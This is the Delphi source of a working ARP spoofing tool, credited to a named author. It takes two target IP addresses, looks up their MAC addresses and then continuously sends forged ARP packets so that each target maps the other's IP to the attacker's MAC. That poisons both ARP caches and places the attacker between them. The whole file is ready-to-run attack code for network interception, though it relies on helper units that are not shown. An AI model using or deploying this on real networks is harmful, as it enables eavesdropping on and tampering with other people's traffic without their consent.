program arpspoof;

//get iphlpapi.zip from here : https://github.com/project-jedi/website/blob/master/delphi-jedi.org/www/files/api/IpHlpApi.zip

uses winsock,windows,sysutils,classes,usnoop,
  iphlpapi, lib,uconsole ;



var
  cards:TStringList;
  snoop_cards,snoop1:TSnoop;
  i:byte;
  ip1,ip2:dword;
  str_ip1,str_ip2:string;
  index:integer=0;
  mac0,mac1,mac2:array[0..5] of byte;
  mac_len:ulong=6;
  dwret:dword=0;
  iret:integer=0;
  info:TAdapterInfo ;



begin
  writeln('arpspoof 1.0 by erwan2212@gmail.com');
  writeln('arpspoof list-interfaces');
  writeln('arpspoof interface-index ip1 ip2');
    //
    try
    snoop_cards:=TSnoop.Create;
    except
    on e:exception do begin writeln(e.message) ;exit;end;
    end;
    cards :=snoop_cards.AdapterDescriptions  ;
    snoop_cards.Free ;
    //
    if pos('list',cmdline)>0 then
    begin
    writeln('*****************');
    writeln('index:description');
    for i:=0 to  cards.count -1 do  writeln(inttostr(i)+':'+cards[i])  ;
    writeln('*****************');
    end;
    if Paramcount =3 then
    begin
    //we need to retrieve the mac addresses of our targets
    try
    fillchar(mac0,6,0);fillchar(mac1,6,0);fillchar(mac2,6,0);
    str_ip1:=paramstr(2);
    ip1:=inet_Addr(PansiChar(ansistring(str_ip1)));
    str_ip2:=paramstr(3);
    ip2:=inet_Addr(PansiChar(ansistring(str_ip2)));
    dwret:=sendarp(ip1,INADDR_ANY ,@mac1[0],mac_len);
    if dwret=0 then writeln('ip1:'+str_ip1+' mac1:'+usnoop.snoopMac2Str (SNOOPMACADDRESS(mac1))) else raise exception.create('cannot resolve ip1 to mac');
    dwret:=sendarp(ip2,INADDR_ANY ,@mac2[0],mac_len);
    if dwret=0 then writeln('ip2:'+str_ip2+' mac2:'+usnoop.snoopMac2Str (SNOOPMACADDRESS(mac2))) else raise exception.create('cannot resolve ip2 to mac');
    except
      on e:exception do begin writeln(e.message);exit;end;
    end;
    //we need to retrieve the mac address of local the selected interface
    try
    index:=strtoint(paramstr(1));
    iret:=GetAdaptersInfo_ (info,'');
    if iret>0 then
       begin
       for i:=0 to iret -1 do
           begin
           if info[i].Description =cards[index]
              then SNOOPMACADDRESS(mac0):=snoopStr2Mac(info[i].AdrMac ) ;
           end;
       writeln('spoofed mac:'+usnoop.snoopMac2Str (SNOOPMACADDRESS(mac0)));
       end
       else raise exception.create('cannot retrieve local mac');
    except
      on e:exception do begin writeln(e.message);exit;end;
    end;
    //
    snoop1:=TSnoop.Create;
    Snoop1.Filter := 'arp'; //optional but no need to capture
    snoop1.ReadTimeOut := 100;
    Snoop1.SnapLen := 1600;
    Snoop1.ThreadSafe := false;
    Snoop1.AdapterIndex := index ;
    snoop1.open;
    writeln('sending packets...press a key to stop...');
    while 1=1 do
    begin
        //telling ip2 we are ip1
        iret:=send_arprequest(snoop1.pcap,mac0,mac2,str_ip1,str_ip2 );
        //telling ip1 we are ip2
        iret:=send_arprequest(snoop1.pcap,mac0,mac1,str_ip2,str_ip1 );
        sleep(50);
    if KeyPressed =true then break;
    end;
    snoop1.Close ;
    snoop1.Destroy ;
    //
    end;//if Paramcount =3 then
end.

